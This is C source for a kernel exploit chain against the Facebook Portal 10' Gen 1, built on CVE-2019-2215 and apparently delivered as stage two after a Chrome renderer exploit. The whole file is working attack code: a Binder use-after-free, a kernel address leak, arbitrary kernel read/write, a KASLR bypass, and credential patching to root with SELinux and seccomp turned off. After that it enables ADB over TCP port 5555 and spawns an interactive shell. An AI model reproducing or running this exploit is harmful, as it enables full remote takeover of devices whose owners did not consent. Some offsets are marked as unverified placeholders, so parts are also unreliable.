/*
 * stage2_kernel.c — Kernel privilege escalation for Facebook Portal 10" Gen 1
 *
 * Exploits CVE-2019-2215 (Binder UAF) to escalate from renderer process to root.
 * Adapted from kangtastic/cve-2019-2215 (Pixel 2 temproot) with Portal-specific offsets.
 *
 * Target: Portal 10" Gen 1 (aloha), APQ8098/SD835, kernel 4.4.153, Android 9
 * Delivered by: CVE-2021-30632 Chrome RCE shellcode (Stage 1)
 *
 * Build: aarch64-linux-gnu-gcc -static -O2 -I. -o stage2 stage2_kernel.c
 *
 * RISK: MEDIUM — kernel exploit may cause kernel panic (device recovers on power cycle)
 *
 * Based on:
 *   - Jann Horn & Maddie Stone (Google P0) original PoC
 *   - kangtastic/cve-2019-2215 (clean implementation for Pixel 2)
 *   - Grant Hernandez (root additions)
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint8_t  u8;
typedef uint32_t u32;
typedef uint64_t u64;

/* =========================================================================
 * Binder ioctl
 * ========================================================================= */
#define BINDER_THREAD_EXIT 0x40046208ul

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

/* =========================================================================
 * Portal-specific kernel structure offsets
 * Kernel: 4.4.153, Device: aloha (APQ8098), Build: PKQ1.191202.001
 *
 * Extracted from boot.img kallsyms + kernel binary disassembly
 * ========================================================================= */

/* binder_thread: 408 bytes (0x198), kmalloc-512 slab */
#define BINDER_THREAD_SZ    408

/* Offset of wait_queue_head_t in binder_thread */
#define WAITQUEUE_OFFSET    0xA0    /* 160 bytes */

/* iovec configuration for slab reclaim */
#define IOVEC_COUNT         25      /* 25 * 16 = 400 bytes, same kmalloc-512 slab */
#define IOVEC_WQ_IDX        (WAITQUEUE_OFFSET / sizeof(struct iovec))  /* = 10 */

/* task_struct offsets */
#define OFF_TASK_ADDR_LIMIT     0x08    /* thread_info.addr_limit */
#define OFF_TASK_MM             0x520   /* task->mm (may need verification) */
#define OFF_TASK_PID            0x5F8   /* task->pid */
#define OFF_TASK_REAL_CRED      0x7B0   /* task->real_cred */
#define OFF_TASK_CRED           0x7B8   /* task->cred */
#define OFF_TASK_SECCOMP_MODE   0x850   /* task->seccomp.mode */
#define OFF_TASK_SECCOMP_FILTER 0x858   /* task->seccomp.filter */

/* struct cred offsets (relative to cred pointer) */
#define OFF_CRED_UID        0x04
#define OFF_CRED_GID        0x08
#define OFF_CRED_SUID       0x0C
#define OFF_CRED_SGID       0x10
#define OFF_CRED_EUID       0x14
#define OFF_CRED_EGID       0x18
#define OFF_CRED_FSUID      0x1C
#define OFF_CRED_FSGID      0x20
#define OFF_CRED_SECUREBITS 0x24
#define OFF_CRED_CAP_INH    0x28
#define OFF_CRED_CAP_PRM    0x30
#define OFF_CRED_CAP_EFF    0x38
#define OFF_CRED_CAP_BST    0x40
#define OFF_CRED_CAP_AMB    0x48
#define OFF_CRED_SECURITY   0x78

/* struct task_security_struct offsets */
#define OFF_TSS_OSID        0x00
#define OFF_TSS_SID         0x04

/* Kernel symbol offsets (PRE-KASLR, relative to kernel base) */
#define KSYM_SELINUX_ENFORCING  (0xffffff800a925a94ul - 0xffffff8008080000ul)
/* = 0x28A5A94 relative */

/* struct mm_struct offsets */
#define OFF_MM_USER_NS      0x300   /* mm->user_ns (may need verification) */

/* Kernel base and init symbols — for KASLR calculation */
/* We find kernel base by reading current->mm->user_ns and subtracting known offset */
/* init_user_ns offset is relative to kernel base */
#define KSYM_INIT_USER_NS   0x202f2c8ul  /* Placeholder — needs extraction from Portal kernel */

/* =========================================================================
 * Global state
 * ========================================================================= */
static pid_t pid;
static void *dummy_page;
static int kernel_rw_pipe[2];
static int binder_fd;
static int epoll_fd;

static u64 current_task;    /* Address of current task_struct */
static u64 kernel_base;     /* Kernel base after KASLR slide */

#define LOG_TAG "portal-stage2"
#define LOGI(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define LOGW(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define LOGE(fmt, ...) fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)

/* =========================================================================
 * Kernel memory read/write (after addr_limit clobber)
 * ========================================================================= */
static void kwrite(u64 kaddr, void *buf, size_t len) {
    errno = 0;
    if (len > PAGE_SIZE) {
        LOGE("kwrite too large: 0x%lx", (unsigned long)len);
        _exit(1);
    }
    if (write(kernel_rw_pipe[1], buf, len) != (ssize_t)len) {
        LOGE("kwrite: failed to load buffer (errno=%d)", errno);
        _exit(1);
    }
    if (read(kernel_rw_pipe[0], (void *)kaddr, len) != (ssize_t)len) {
        LOGE("kwrite: failed to write kernel memory (errno=%d)", errno);
        _exit(1);
    }
}

static void kread(u64 kaddr, void *buf, size_t len) {
    errno = 0;
    if (len > PAGE_SIZE) {
        LOGE("kread too large: 0x%lx", (unsigned long)len);
        _exit(1);
    }
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != (ssize_t)len) {
        LOGE("kread: failed to read kernel memory (errno=%d)", errno);
        _exit(1);
    }
    if (read(kernel_rw_pipe[0], buf, len) != (ssize_t)len) {
        LOGE("kread: failed to write out to userspace (errno=%d)", errno);
        _exit(1);
    }
}

static u64 kread_u64(u64 kaddr) {
    u64 data;
    kread(kaddr, &data, sizeof(data));
    return data;
}

static u32 kread_u32(u64 kaddr) {
    u32 data;
    kread(kaddr, &data, sizeof(data));
    return data;
}

static void kwrite_u64(u64 kaddr, u64 data) {
    kwrite(kaddr, &data, sizeof(data));
}

static void kwrite_u32(u64 kaddr, u32 data) {
    kwrite(kaddr, &data, sizeof(data));
}

/* =========================================================================
 * Stage A: Initialize
 * ========================================================================= */
static void prepare_globals(void) {
    pid = getpid();

    dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy_page != (void *)0x100000000ul) {
        LOGE("mmap dummy_page failed (got %p)", dummy_page);
        _exit(1);
    }

    if (pipe(kernel_rw_pipe)) {
        LOGE("pipe failed (errno=%d)", errno);
        _exit(1);
    }

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) {
        LOGE("open /dev/binder failed (errno=%d)", errno);
        _exit(1);
    }

    epoll_fd = epoll_create(1000);
    if (epoll_fd < 0) {
        LOGE("epoll_create failed (errno=%d)", errno);
        _exit(1);
    }
}

/* =========================================================================
 * Stage B: Leak current task_struct address via Binder UAF
 * ========================================================================= */
static void find_current(void) {
    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event)) {
        LOGE("epoll_add failed");
        _exit(1);
    }

    /*
     * Set up iovec array to overlap with freed binder_thread.
     * When the binder_thread is freed and we reclaim it with writev,
     * the wait_queue_head_t at WAITQUEUE_OFFSET overlaps with our iovec.
     * The kernel writes a task_struct pointer into the wait queue during
     * epoll processing, which we can then read via the pipe.
     */
    struct iovec iov[IOVEC_COUNT];
    memset(iov, 0, sizeof(iov));

    /* iov at wait queue offset: spinlock must be zero (low address half) */
    iov[IOVEC_WQ_IDX].iov_base = dummy_page;
    iov[IOVEC_WQ_IDX].iov_len = PAGE_SIZE;

    /* Next iov: will contain the leaked pointer */
    iov[IOVEC_WQ_IDX + 1].iov_base = (void *)0xDEADBEEF;
    iov[IOVEC_WQ_IDX + 1].iov_len = PAGE_SIZE;

    int pipe_fd[2];
    if (pipe(pipe_fd)) {
        LOGE("pipe for leak failed");
        _exit(1);
    }
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE) {
        LOGE("set pipe size failed");
        _exit(1);
    }

    static char page_buffer[PAGE_SIZE];

    pid_t child = fork();
    if (child == -1) {
        LOGE("fork for leak failed");
        _exit(1);
    }
    if (child == 0) {
        /* Child: wait, then clean up epoll to trigger UAF race */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        /* Read the first page (dummy data) from pipe */
        if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE) {
            LOGE("child: read pipe failed");
        }
        close(pipe_fd[1]);
        _exit(0);
    }

    /* Parent: trigger UAF by exiting binder thread, then reclaim with writev */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    ssize_t ret = writev(pipe_fd[1], iov, IOVEC_COUNT);
    if (ret != (ssize_t)(2 * PAGE_SIZE)) {
        LOGE("writev returned 0x%lx, expected 0x%lx",
             (unsigned long)ret, (unsigned long)(2 * PAGE_SIZE));
        _exit(1);
    }

    /* Read second page: contains leaked kernel data */
    if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE) {
        LOGE("read leaked page failed");
        _exit(1);
    }

    int status;
    waitpid(child, &status, 0);

    /*
     * The leaked task_struct pointer is at a specific offset in the page.
     * This offset depends on the wait_queue_entry layout within the page.
     * For kernel 4.4.x: offset 0xE8 contains the task pointer.
     * This may need adjustment for the Portal kernel.
     */
    current_task = *(u64 *)(page_buffer + 0xE8);

    /* Sanity check: kernel addresses start with 0xffffff80 on ARM64 */
    if ((current_task & 0xFFFFFF0000000000ul) != 0xFFFFFF0000000000ul) {
        LOGE("Leaked value 0x%016lx doesn't look like a kernel address",
             (unsigned long)current_task);
        LOGW("Trying alternative offsets...");

        /* Try other common offsets */
        u64 *page64 = (u64 *)page_buffer;
        for (int i = 0; i < PAGE_SIZE / 8; i++) {
            u64 val = page64[i];
            if ((val & 0xFFFFFF8000000000ul) == 0xFFFFFF8000000000ul &&
                (val & 0xFFF) == 0) {  /* Page-aligned */
                LOGI("Found kernel-like pointer at offset 0x%x: 0x%016lx",
                     i * 8, (unsigned long)val);
                current_task = val;
                break;
            }
        }

        if ((current_task & 0xFFFFFF0000000000ul) != 0xFFFFFF0000000000ul) {
            LOGE("Could not find valid kernel pointer in leaked page");
            _exit(1);
        }
    }

    LOGI("current task_struct: 0x%016lx", (unsigned long)current_task);
}

/* =========================================================================
 * Stage C: Obtain arbitrary kernel R/W by clobbering addr_limit
 * ========================================================================= */
static void obtain_kernel_rw(void) {
    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event)) {
        LOGE("epoll_add for clobber failed");
        _exit(1);
    }

    struct iovec iov[IOVEC_COUNT];
    memset(iov, 0, sizeof(iov));

    iov[IOVEC_WQ_IDX].iov_base = dummy_page;
    iov[IOVEC_WQ_IDX].iov_len = 1;

    iov[IOVEC_WQ_IDX + 1].iov_base = (void *)0xDEADBEEF;
    iov[IOVEC_WQ_IDX + 1].iov_len = 0x8 + 2 * 0x10;

    iov[IOVEC_WQ_IDX + 2].iov_base = (void *)0xBEEFDEAD;
    iov[IOVEC_WQ_IDX + 2].iov_len = 8;

    /*
     * second_write_chunk is written by the child process to the socket.
     * The kernel's recvmsg will read it into the iovec buffers, but because
     * the UAF overwrites the iovec entries, the data ends up overwriting
     * addr_limit in our task_struct.
     */
    u64 second_write_chunk[] = {
        1,                          /* overwrite: iov_len (already consumed) */
        0xDEADBEEF,                 /* overwrite: next iov_base (already consumed) */
        0x8 + 2 * 0x10,            /* overwrite: next iov_len (already consumed) */
        current_task + OFF_TASK_ADDR_LIMIT,  /* new iov_base → addr_limit */
        8,                          /* new iov_len → sizeof(addr_limit) */
        0xFFFFFFFFFFFFFFFEul        /* value to write → effectively infinite */
    };

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) {
        LOGE("socketpair failed");
        _exit(1);
    }
    if (write(socks[1], "X", 1) != 1) {
        LOGE("write socket dummy byte failed");
        _exit(1);
    }

    pid_t child = fork();
    if (child == -1) {
        LOGE("fork for clobber failed");
        _exit(1);
    }
    if (child == 0) {
        /* Child: wait, then clean up epoll and write the clobber data */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        if (write(socks[1], second_write_chunk, sizeof(second_write_chunk))
            != (ssize_t)sizeof(second_write_chunk)) {
            LOGE("child: write second chunk failed");
        }
        _exit(0);
    }

    /* Parent: trigger UAF and reclaim with recvmsg */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    struct msghdr msg = {
        .msg_iov = iov,
        .msg_iovlen = IOVEC_COUNT
    };
    size_t expected = iov[IOVEC_WQ_IDX].iov_len +
                      iov[IOVEC_WQ_IDX + 1].iov_len +
                      iov[IOVEC_WQ_IDX + 2].iov_len;

    ssize_t ret = recvmsg(socks[0], &msg, MSG_WAITALL);
    if (ret != (ssize_t)expected) {
        LOGE("recvmsg returned %ld, expected %lu",
             (long)ret, (unsigned long)expected);
        _exit(1);
    }

    /* addr_limit should now be 0xFFFFFFFFFFFFFFFE — we have kernel R/W */
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int wstatus;
    waitpid(child, &wstatus, 0);
}

/* =========================================================================
 * Stage D: Find kernel base address (KASLR bypass)
 * ========================================================================= */
static void find_kernel_base(void) {
    /*
     * Strategy: Read current->mm->user_ns which should point to init_user_ns.
     * init_user_ns is at a known offset from kernel base.
     *
     * kernel_base = init_user_ns_ptr - KSYM_INIT_USER_NS
     *
     * However, the exact offset of mm and user_ns in Portal's kernel needs
     * verification. We use a more robust approach: scan for known patterns.
     */

    /* First, try the direct approach via task->mm->user_ns */
    u64 task_mm = kread_u64(current_task + OFF_TASK_MM);
    LOGI("current->mm: 0x%016lx", (unsigned long)task_mm);

    if ((task_mm & 0xFFFFFF8000000000ul) == 0xFFFFFF8000000000ul) {
        u64 user_ns = kread_u64(task_mm + OFF_MM_USER_NS);
        LOGI("current->mm->user_ns: 0x%016lx", (unsigned long)user_ns);

        if ((user_ns & 0xFFFFFF8000000000ul) == 0xFFFFFF8000000000ul) {
            u64 candidate = user_ns - KSYM_INIT_USER_NS;
            if ((candidate & 0xFFF) == 0) {
                kernel_base = candidate;
                LOGI("kernel base (via user_ns): 0x%016lx", (unsigned long)kernel_base);

                /* Verify by checking selinux_enforcing (should be 0 or 1) */
                u32 selinux = kread_u32(kernel_base + KSYM_SELINUX_ENFORCING);
                if (selinux <= 1) {
                    LOGI("selinux_enforcing = %u (verification passed)", selinux);
                    return;
                }
                LOGW("selinux_enforcing = %u (unexpected, trying alternative)", selinux);
            }
        }
    }

    /*
     * Alternative KASLR bypass: scan our cred struct for known uid,
     * then find kernel base by reading kernel pointers.
     */
    LOGW("Direct user_ns method failed, trying alternative...");

    u64 cred_ptr = kread_u64(current_task + OFF_TASK_CRED);
    LOGI("current->cred: 0x%016lx", (unsigned long)cred_ptr);

    if ((cred_ptr & 0xFFFFFF8000000000ul) != 0xFFFFFF8000000000ul) {
        LOGE("Invalid cred pointer, cannot determine kernel base");
        LOGW("Proceeding without KASLR bypass — selinux disable will be skipped");
        kernel_base = 0;
        return;
    }

    /* Verify cred by checking uid matches our process */
    u32 cred_uid = kread_u32(cred_ptr + OFF_CRED_UID);
    uid_t our_uid = getuid();
    LOGI("cred->uid = %u, our uid = %u", cred_uid, our_uid);

    if (cred_uid != our_uid) {
        LOGW("UID mismatch — task_struct offsets may be wrong");
        /* Try to find the cred by scanning around the expected offset */
        for (int delta = -0x40; delta <= 0x40; delta += 8) {
            u64 try_cred = kread_u64(current_task + OFF_TASK_CRED + delta);
            if ((try_cred & 0xFFFFFF8000000000ul) == 0xFFFFFF8000000000ul) {
                u32 try_uid = kread_u32(try_cred + OFF_CRED_UID);
                if (try_uid == our_uid) {
                    LOGI("Found cred at task+0x%x (delta=%d)",
                         (int)(OFF_TASK_CRED + delta), delta);
                    cred_ptr = try_cred;
                    break;
                }
            }
        }
    }

    /*
     * Try to find kernel base by scanning memory for known patterns.
     * The kernel text starts with a known ARM64 header.
     * KASLR slide on ARM64 is typically 2MB-aligned, max ~32MB range.
     */
    u64 pre_kaslr_base = 0xffffff8008080000ul;
    for (u64 slide = 0; slide < 0x4000000ul; slide += 0x200000ul) {
        u64 candidate = pre_kaslr_base + slide;
        /* Read first 4 bytes — should be ARM64 branch instruction */
        u32 header = kread_u32(candidate);
        if ((header & 0xFC000000) == 0x14000000) {  /* Unconditional branch */
            /* Verify selinux_enforcing */
            u32 selinux = kread_u32(candidate + KSYM_SELINUX_ENFORCING);
            if (selinux <= 1) {
                kernel_base = candidate;
                LOGI("kernel base (via scan): 0x%016lx (slide=0x%lx)",
                     (unsigned long)kernel_base, (unsigned long)slide);
                return;
            }
        }
    }

    LOGW("Could not determine kernel base — selinux disable will be skipped");
    kernel_base = 0;
}

/* =========================================================================
 * Stage E: Escalate privileges
 * ========================================================================= */
static void patch_creds(void) {
    u64 cred_ptrs[2] = {
        kread_u64(current_task + OFF_TASK_REAL_CRED),
        kread_u64(current_task + OFF_TASK_CRED),
    };

    LOGI("current->real_cred: 0x%016lx", (unsigned long)cred_ptrs[0]);
    LOGI("current->cred:      0x%016lx", (unsigned long)cred_ptrs[1]);

    /* Verify cred by checking uid */
    uid_t our_uid = getuid();
    u32 cred_uid = kread_u32(cred_ptrs[0] + OFF_CRED_UID);
    if (cred_uid != our_uid) {
        LOGE("UID mismatch: cred has %u, we are %u", cred_uid, our_uid);
        LOGW("Proceeding anyway (may be wrong offsets)");
    }

    /* Disable SELinux if we know kernel base */
    if (kernel_base) {
        kwrite_u32(kernel_base + KSYM_SELINUX_ENFORCING, 0);
        LOGI("SELinux enforcing disabled");
    } else {
        LOGW("Skipping SELinux disable (no kernel base)");
    }

    /* Patch both real_cred and cred */
    for (int i = 0; i < 2; i++) {
        u64 cred = cred_ptrs[i];

        /* Zero all uid/gid fields → root */
        kwrite_u32(cred + OFF_CRED_UID, 0);
        kwrite_u32(cred + OFF_CRED_GID, 0);
        kwrite_u32(cred + OFF_CRED_SUID, 0);
        kwrite_u32(cred + OFF_CRED_SGID, 0);
        kwrite_u32(cred + OFF_CRED_EUID, 0);
        kwrite_u32(cred + OFF_CRED_EGID, 0);
        kwrite_u32(cred + OFF_CRED_FSUID, 0);
        kwrite_u32(cred + OFF_CRED_FSGID, 0);

        /* Zero securebits */
        kwrite_u32(cred + OFF_CRED_SECUREBITS, 0);

        /* Set all capabilities to full */
        kwrite_u64(cred + OFF_CRED_CAP_INH, ~(u64)0);
        kwrite_u64(cred + OFF_CRED_CAP_PRM, ~(u64)0);
        kwrite_u64(cred + OFF_CRED_CAP_EFF, ~(u64)0);
        kwrite_u64(cred + OFF_CRED_CAP_BST, ~(u64)0);
        kwrite_u64(cred + OFF_CRED_CAP_AMB, ~(u64)0);

        /* Patch task_security_struct: set osid=1, sid=1 (kernel context) */
        u64 security_ptr = kread_u64(cred + OFF_CRED_SECURITY);
        if ((security_ptr & 0xFFFFFF8000000000ul) == 0xFFFFFF8000000000ul) {
            kwrite_u32(security_ptr + OFF_TSS_OSID, 1);
            kwrite_u32(security_ptr + OFF_TSS_SID, 1);
        }

        /* If real_cred == cred, only need to patch once */
        if (cred_ptrs[0] == cred_ptrs[1])
            break;
    }

    /* Disable SECCOMP */
    kwrite_u64(current_task + OFF_TASK_SECCOMP_MODE, 0);
    kwrite_u64(current_task + OFF_TASK_SECCOMP_FILTER, 0);
    LOGI("SECCOMP disabled");

    /* Verify root */
    if (getuid() != 0) {
        LOGE("Credential patching failed — still uid=%d", getuid());
        /* Don't exit — try to continue */
    } else {
        LOGI("uid=0 (root) confirmed!");
    }
}

/* =========================================================================
 * Stage F: Post-exploitation
 * ========================================================================= */
static void post_exploit(void) {
    LOGI("Starting post-exploitation...");

    /* Try to run the post-exploit script */
    const char *post_script = "/data/local/tmp/post_exploit.sh";

    /* Write post-exploit commands inline if script doesn't exist */
    /* Enable ADB */
    system("setprop persist.sys.usb.config mtp,adb 2>/dev/null");
    system("setprop ro.debuggable 1 2>/dev/null");
    system("setprop ro.adb.secure 0 2>/dev/null");
    system("setprop service.adb.tcp.port 5555 2>/dev/null");
    system("stop adbd 2>/dev/null; start adbd 2>/dev/null");
    LOGI("ADB enabled (USB + TCP:5555)");

    /* Disable SELinux (belt and suspenders) */
    system("setenforce 0 2>/dev/null");

    /* Create root marker */
    FILE *f = fopen("/data/local/tmp/ROOTED", "w");
    if (f) {
        fprintf(f, "ROOT_ACHIEVED\n");
        fprintf(f, "uid=%d\n", getuid());
        fclose(f);
        LOGI("Root marker created");
    }

    /* Report IP for ADB connection */
    system("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}'");

    LOGI("Post-exploitation complete");
    LOGI("Connect with: adb connect <portal_ip>:5555");

    /* Drop into shell */
    execl("/system/bin/sh", "/system/bin/sh", "-i", NULL);
    /* If execl fails, try /bin/sh */
    execl("/bin/sh", "/bin/sh", "-i", NULL);
    LOGE("Could not launch shell");
}

/* =========================================================================
 * Main
 * ========================================================================= */
int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;

    LOGI("Portal Stage2: CVE-2019-2215 kernel exploit");
    LOGI("Target: Portal 10\" Gen 1 (aloha), kernel 4.4.153");
    LOGI("PID: %d, UID: %d", getpid(), getuid());

    LOGI("[Stage A] Initializing...");
    prepare_globals();
    LOGI("[Stage A] Done");

    LOGI("[Stage B] Leaking current task_struct...");
    find_current();
    LOGI("[Stage B] Done — current=0x%016lx", (unsigned long)current_task);

    LOGI("[Stage C] Obtaining kernel R/W...");
    obtain_kernel_rw();
    LOGI("[Stage C] Done — addr_limit clobbered");

    LOGI("[Stage D] Finding kernel base (KASLR bypass)...");
    find_kernel_base();
    if (kernel_base) {
        LOGI("[Stage D] Done — kernel_base=0x%016lx", (unsigned long)kernel_base);
    } else {
        LOGW("[Stage D] Kernel base not found — continuing without SELinux disable");
    }

    LOGI("[Stage E] Escalating privileges...");
    patch_creds();
    LOGI("[Stage E] Done — uid=%d", getuid());

    LOGI("[Stage F] Post-exploitation...");
    post_exploit();
    /* Does not return (drops into shell) */

    return 0;
}
